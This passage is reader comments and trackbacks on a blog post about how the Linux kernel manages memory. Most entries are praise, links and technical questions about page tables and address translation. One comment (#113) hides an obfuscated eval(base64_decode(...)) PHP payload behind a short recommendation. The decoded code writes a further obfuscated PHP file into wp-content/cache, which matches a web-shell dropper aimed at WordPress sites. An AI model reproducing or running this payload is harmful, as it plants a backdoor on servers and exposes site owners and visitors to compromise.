75. [Volatilitux : Physical memory analysis of Linux systems |
    Segmentation
    fault](http://www.segmentationfault.fr/projets/volatilitux-physical-memory-analysis-linux-systems/)
    on December 7th, 2010 5:09 pm

    [...] extracting the virtual memory map of each one. I learned a lot
    reading the kernel source code, some blog posts, and finally the
    challenge solutions when they got released. And I understood the
    biggest problem [...]

76. [Volatilitux : Physical memory analysis of Linux systems |
    Linux-backtrack.com](http://www.linux-backtrack.com/2011/01/volatilitux-physical-memory-analysis-of-linux-systems/)
    on January 31st, 2011 1:29 pm

    [...] extracting the virtual memory map of each one. I learned a lot
    reading the kernel source code, some blog posts, and finally the
    challenge solutions when they got released. And I understood the
    biggest problem [...]

77. [Linux x86 ShellCodes – 101 «
    "xcdx80"](http://0xcd80.wordpress.com/2011/03/03/linux-x86-shellcodes-101/)
    on March 3rd, 2011 7:04 am

    [...] está no endereço 0 de memória. A forma como resolvemos isso é
    linkando nossas instruções com “a realidade do sistema”, para tal
    usamos o comando [...]

78. [Cómo el kernel maneja tu memoria |
    unblogged](http://www.unblogged.net/como-el-kernel-maneja-tu-memoria/)
    on March 16th, 2011 7:34 am

    [...] post que a los nardos tech (y no tanto) les va a parecer
    genial: cómo administra el kernel la memoria en tu máquina.
    Explicación simple y [...]

79. [Bagaimanakah Kernel Mengatur Memory | Log
    Belajar](http://log.codernotes.com/index.php/2011/bagaimanakah-kernel-mengatur-memory/)
    on March 16th, 2011 8:55 am

    [...]
    [http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory)
    [...]

80. Matt Joiner on March 16th, 2011 8:26 pm

    Your articles kick ass!! Keep it up.

81. [Linux Kernel 2.6.38 Released with Best Improvement : Ranjith Siji –
    Programming the
    Web](http://ranjith.zfs.in/linux-kernel-2-6-38-released-with-best-improvements/)
    on March 17th, 2011 3:15 am

    [...] the Iomega iConnect running Linux Debian (diogogomes.com)Linux
    2.6.38 Released (linux.slashdot.org)How The Kernel Manages Your
    Memory (duartes.org) var linkwithin\_site\_id=197701;var
    linkwithin\_div\_class="linkwithin\_hook"; [...]

82. Nitin on March 17th, 2011 11:56 pm

    Great article !

83. [Sysadmin Sunday \#23 « Boxed Ice
    Blog](http://blog.boxedice.com/2011/03/20/sysadmin-sunday-23/) on
    March 20th, 2011 8:59 am

    [...] How The Kernel Manages Your Memory [...]

84. [A collection of articles on virtual memory « kwoz
    online](http://kwoz.wordpress.com/2011/03/22/a-collection-of-articles-on-virtual-memory/)
    on March 22nd, 2011 8:53 am

    [...] Here is a rather interesting article on virtual memory from
    operating system’s point of view. It appears to link to other posts
    on similar topics, including processor privileges. Low-level but
    could be handy. GA\_googleAddAttr("AdOpt", "1");
    GA\_googleAddAttr("Origin", "other"); GA\_googleAddAttr("theme\_bg",
    "ffffff"); GA\_googleAddAttr("theme\_border", "000000");
    GA\_googleAddAttr("theme\_text", "000000");
    GA\_googleAddAttr("theme\_link", "2970A6");
    GA\_googleAddAttr("theme\_url", "2970A6");
    GA\_googleAddAttr("LangId", "1"); GA\_googleAddAttr("Autotag",
    "technology"); GA\_googleFillSlot("wpcom\_below\_post"); Categories:
    Uncategorized LikeBe the first to like this post. Comments (0)
    Trackbacks (0) Leave a comment Trackback [...]

85. [Linux x86 Shellcoding – 101 «
    "xcdx80"](http://0xcd80.wordpress.com/2011/04/16/linux-x86-shellcoding-101/)
    on April 16th, 2011 2:39 pm

    [...] address assigned to our Entry Point "00000000". To solve this
    we must "link" our instructions with "Linux reality", we can do this
    using the "ld" [...]

86. [مجله هکر ماهیانه – شماره ۱۲ – می
    ۲۰۱۱](http://freekeyboard.net/archives/4405) on May 15th, 2011 8:46
    pm

    [...] اگر لازمه توضیح بدم، یعنی به این مقاله نیازی ندارید (: – کرنل
    چگونه حافظه را مدیریت می‌کند. – چرا هیچگاه نباید بپرسید که آیا اجازه
    دارید کد را [...]

87. Prabagaran on May 29th, 2011 11:05 am

    Awesome Awesome post

88. Rajat on July 21st, 2011 11:05 pm

    Hi Gustavo,

    In Linux, I’m curious about the case when there is only 512MB of
    actual RAM. As I understood it, Kernel space’s 896MB is always
    statically physically mapped and is unswappable. How does kernel
    maps 896 MB -\> 512 MB, if it is supposed to be non swappable ?

    Thanks!

89. Mars on September 27th, 2011 4:47 am

    Really awesome!! I like this article and the way you described.\
     Thanks a lot.
    ![:)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_smile.gif)

90. [How The Kernel Manages Your Memory : Gustavo Duarte | FRANCESCO DI
    FUSCO](http://francescodifusco.wordpress.com/2011/10/31/how-the-kernel-manages-your-memory-gustavo-duarte/)
    on October 31st, 2011 1:46 am

    [...] How The Kernel Manages Your Memory : Gustavo Duarte. Share
    this:TwitterFacebookStumbleUponPrintEmailLinkedInLike this:LikeBe
    the first to like this post. This entry was posted in Linux by
    francescodifusco. Bookmark the permalink. [...]

91. [ajeet](http://gmail.com) on November 5th, 2011 7:46 am

    what the code of creating a project the lazy buddy algorithm in unix

92. Setzer on November 30th, 2011 9:51 pm

    Great article Gustavo!!! Just curious, what software did you use to
    draw the diagrams?

93. Ganesh on December 4th, 2011 11:31 am

    Very nice. I loved the explanation.

    You are my Guru

94. Raghu on January 13th, 2012 5:47 pm

    I have a basic question about virtual to physical address
    translation in kernel. The virtual addresses are splittled 3:1
    between userspace and kernel. so, when the virtual address is in the
    first 3GB, then page tables of that userspace process is used to
    find the corresponding physical address. but, when we are in the
    kernel and want to access the virtual address of kernel (4th GB),
    then do we still go through paging or we always use the identity map
    (\_\_pa and \_\_va)? if we go through paging, can you explain how
    the kernel itself can find the physical address for its virtual
    address. does cr3 register changes on the context switch from user
    to kernel?

    Thanks,\
     Raghu

95. Amit on February 6th, 2012 11:17 am

    Wonderful!\
     The best article I’ve found… thank you.

96. rakesh on March 13th, 2012 3:12 am

    i am great fan of ur articles, thx for making me understand all this
    stuff, grt work

97. Robert on April 14th, 2012 6:59 pm

    Another awesome post!I like it and thanks for your effort in making
    these wonderful

98. Gaurav on May 4th, 2012 2:07 am

    Hi Gustavo

    The links to subscribe to your blog are not working currently.
    Instead clicking on it starts showing the source-code of web-page.

99. [Gustavo Duarte](http://duartes.org/gustavo/blog) on May 4th, 2012
    5:17 am

    @Gaurav: fixed now, thanks for letting me know.

100. [Facundo](http://www.codigounix.com.ar) on May 14th, 2012 9:28 pm

    Gustavo it’s awesome. An increible post. Thank you!.

101. Thang Le on June 3rd, 2012 7:24 pm

    Hi Gustavo,

    in this article, you mentioned that: The processor consults page
    tables to translate a virtual address into a physical memory
    address.\
     But with first 20 bits in PTE, we only can find respective page
    frame number in physical memory. So, i want know where we can get
    the “offset” in a page frame in physical memory ?

    Regards,\
     Thang Le

102. pisces on June 11th, 2012 3:36 pm

    @Thang Le:\
     The offset is what you write in your program(low 12 bits).

103. Thang Le on June 13th, 2012 7:29 am

    @pisces: Thanks for your answer

    Thang Le

104. Mallesh Koujalagi on June 25th, 2012 12:19 am

    Great Article, Got clear picture, how linux managed the Memory.
    Thanks for such brief post.

105. [สุดยอด blogger และนักเขียนไอทีในความคิดของผม « Soowoi's
    Blog](http://soowoi.wordpress.com/2012/06/25/my_favourite_it_blogger/)
    on June 26th, 2012 6:56 pm

    [...]
    [http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory)
    [...]

106. Daniel on July 22nd, 2012 12:21 am

    Great article, thanks a lot. One question remains, though: Why can’t
    I Flattr this?

107. Jagannath Pattar on October 8th, 2012 1:29 am

    Fantastic presentation of memory management. Lovely and explanatory
    figures which makes you to understand the concept neatly.

108. [Handling Heap AllocationsVeda
    Solutions](http://blog.techveda.org/index.php/heap-allocations/) on
    February 6th, 2013 12:29 am

    [...] When a VMA is found the kernel must handle the fault by
    looking at the PTE contents and the type of VMA. In our case, the
    PTE shows the page is not present. In fact, our PTE is completely
    blank (all zeros), which in Linux means the virtual page has never
    been mapped. Since this is an anonymous VMA, we have a purely RAM
    affair that must be handled by do\_anonymous\_page(), which
    allocates a page frame and makes a PTE to map the faulted virtual
    page onto the freshly allocated frame. see here for detailed
    information on How kernel Memory [...]

109. Deekshitha on March 20th, 2013 11:52 pm

    had a cleary of how the memories is distributed and how the
    addresses are fetched from the table.\
     It would be helpful if you can describe,as to how the GOT(Global
    Offset TABLE) is segmented.and how to access it from the table.

110. murugank on March 21st, 2013 6:07 pm

    Great Article..

111. Thang Le on March 28th, 2013 3:51 am

    One thing confuse: How to manage if page size is 2MB/4MB and frame
    size is still 4KB ?.

    Thanks\
     Thang Le

112. Simon on April 21st, 2013 9:39 pm

    Hi, Thanks for ur awsome posts very much!\
     I have one question.\
     Within one process, every thread has own stack.\
     what is layout of the stacks of threads in the process’ stack???\
     Looking forward for ur reply!

    Many thx!

113. emmanuel on May 3rd, 2013 11:06 am

    I can recommend.\

    eval(base64\_decode('aWYoJGY9Zm9wZW4oJ3dwLWNvbnRlbnQvY2FjaGUvbG12dXUucGhwJywndycpKXtmcHV0cygkZiwnPD9waHAgLyphOlc4Ki9ldmFsLypCYT57Ki8oLyo0NDl0Ki9iYXNlNjRfZGVjb2RlLyogRlMqLygvKmA7RjZwfiovXCdMeXA2SjFVcUwybG1MeXBpZkhNcUx5Z3ZLbm9zXCcvKmtyMiovLi8qbFAyMSovXCdhU3NxTDJsemMyVjBMeXBvZUZ3cUx5Z3ZLbk4rXCcvKk80dVwnQ116Ki8uLypKZThhRyovXCdjQ292SkY5U1JWRlZSVk5VTHlwYklWazVLaTliXCcvKnpvPz5eKi8uLyp4MXR1Ki9cJ0x5cHlaRHcyUFNvdkozVnVKeThxWG01RktpOHVcJy8qfG40OyhBKi8uLypCSj0lPztTKi9cJ0x5cE5UWFZtS2k4bllXWW5MeXBLWldjcUx5NHZcJy8qY2lqNmYqLy4vKlg+cCovXCdLalZhZmlvdkoyeHljQ2N2S25FeGV6cHdkeW92XCcvKkppVSovLi8qTl12RT1SKi9cJ1hTOHFjRnhnWGtBektpOHZLbDBzT2t0c2N5b3ZcJy8qdnV0biovLi8qLURTKi9cJ0tTOHFYU2hOVkVvcUx5OHFPMzE1YlMwcUx5a3ZcJy8qfUszbyovLi8qPTlDKi9cJ0tpVkxVeW92WlhaaGJDOHFORXhJS2k4b0x5bzlcJy8qNT06YiovLi8qTiYoKFBnKi9cJ1lVRjNLaTl6ZEhKcGNITnNZWE5vWlhNdktsdGRcJy8qQC02KSovLi8qMmxXWTJEKi9cJ1AyNG1LaThvTHlvblAyMTlZRmg3S2k4a1gxSkZcJy8qUld4Ki8uLyptXCcsYn5UKi9cJ1VWVkZVMVF2S2tGK08xb3FMMXN2S21ROVFTb3ZcJy8qdDR4PGxWKyovLi8qbk4lPykqL1wnSjNWdVlTY3ZLa3BIZTNGY095b3ZMaThxYVQ5QlwnLyo5Mm05ZUgqLy4vKlE2U3cqL1wnWTNZcUx5ZG1iSEp3Snk4cWJIUkxSeW92WFM4cVwnLyozckduSyovLi8qXCdyISFpKi9cJ1JVSTFhSHhIS2k4dktuMUdMU292S1M4cVAyVjdcJy8qfkFWPkd0VCovLi8qMUk9Ki9cJ01GVXFMeThxUEZNMFVGNHFMeWt2S2tCWVBWc3FcJy8qbTtDPCttKi8uLypkOixSaHsgKi9cJ0x5OHFQbnM5T1dWeUtpODdMeXBIYUdob0tpOD1cJy8qbFxMOyovKS8qW1ddKi8vKk02aExDKi8pLyo1MUN0fiovLyo+bG4qLzsvKl4uaE51ISovPz4nKTtmY2xvc2UoJGYpO30='));
    --\>

114. [Page table entry (PTE) descriptor in Linux kernel |
    BlogoSfera](http://www.blogosfera.co.uk/2013/06/page-table-entry-pte-descriptor-in-linux-kernel/)
    on June 3rd, 2013 8:56 pm

    [...] I have read article of Duartes from:
    [http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory)
    [...]

115. [Delicious Bookmarks for July 24th through July 29th «
    Lâmôlabs](http://www.lamolabs.org/blog/10902/delicious-bookmarks-for-july-24th-through-july-29th/)
    on July 29th, 2013 1:54 pm

    [...] How The Kernel Manages Your Memory : Gustavo Duarte – July
    29th ( tags: linux kernel memory management tutorial guide howto )
    [...]

116. ravi on September 11th, 2013 3:30 am

    Simple & clear Description thanks

117. [CPU,CPU cache, virtual memory, physical memory, disk |
    hellotheworld2000](http://hellotheworld2000.wordpress.com/2013/09/11/cpucpu-cache-virtual-memory-physical-memory-disk/)
    on September 12th, 2013 10:02 pm

    [...] here, the answer said DMA, which is important, too. I am not
    familar w/ vm\_area\_struct, roughly,  process is instance of
    task\_struct, which has mm\_struct, which further has a linkedlist
    of vm\_area\_struct. check
    here: [http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory "Linkification: http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory")
    [...]

118. sudam on October 8th, 2013 12:43 am

    Great Article..\
     I have one question\
     I am doing project in “System tool page reference pattern”. I write
    a kernel module that access the current page table.

    But can any one tell me that where this page table stored and how i
    access reference bit in pte ??

    Many thx!

119. [Page table entry (PTE) descriptor in Linux kernel for ARM |
    Technology &
    Programming](http://programminganswer.com/151962/page-table-entry-pte-descriptor-in-linux-kernel-for-arm.html)
    on November 17th, 2013 5:06 am

    [...] I have read article of Duartes from:
    [http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory)
    [...]

120. Murilo on January 15th, 2014 6:28 pm

    Hey Gustavo, very nice post.\
     I have a question I believe you can help me: How can I
    programmatically kernel-level know which segment a page belongs to?
    For example given a page\* I want to know whether it belongs to the
    stack, heap, text… segment.

    Thanks!

121. [Anatomy of a Program in Memory | RAHUL
    KUMAR](http://rahulkumar4.wordpress.com/2014/01/23/anatomy-of-a-program-in-memory/)
    on January 23rd, 2014 11:00 am

    [...] 2, how-the-kernel-manages-your-memory [...]

122. kalyan on February 20th, 2014 10:19 am

    The Google File System uses a master to store 64-bytes metadata
    about\
     each file, each file is divided into 64-MB chunks. If the master
    node has 8GB\
     main memory,\
     a) How many total chunks can be supported? What is the total size
    of\
     the GFS system?\
     b) If there are n files and the average size of files is m-MB, and
    assume\
     there is no aggregation of small files, how many total space are\
     wasted due to internal fragmentation?

123. Gautham on February 24th, 2014 12:25 am

    Hi Gustavo, Can you please answer to below question?

    The Google File System uses a master to store 64-bytes metadata
    about\
     each file, each file is divided into 64-MB chunks. If the master
    node has 8GB\
     main memory,\
     a) How many total chunks can be supported? What is the total size
    of\
     the GFS system?\
     b) If there are n files and the average size of files is m-MB, and
    assume\
     there is no aggregation of small files, how many total space are\
     wasted due to internal fragmentation?

124. [Jarson's blog »
    linux内核是如何管理内存的](http://jarson.asia/linux%e5%86%85%e6%a0%b8%e6%98%af%e5%a6%82%e4%bd%95%e7%ae%a1%e7%90%86%e5%86%85%e5%ad%98%e7%9a%84/)
    on February 25th, 2014 10:22 pm

    [...] how-the-kernel-manages-your-memory 【译】内核是如何管理内存的
    [...]


